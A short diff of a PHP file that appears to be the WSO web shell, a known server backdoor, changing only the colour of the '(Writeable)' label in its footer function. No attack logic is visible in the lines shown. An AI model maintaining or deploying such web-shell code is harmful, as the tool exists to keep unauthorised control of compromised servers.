@@ -301,7 +301,7 @@ href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"
 }
 
 function wsoFooter() {
-	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#25ff00'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
+	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#2ecc71'>(Writeable)</font>":" <font color=red>(Not writable)</font>";
     echo "
 
 </div>
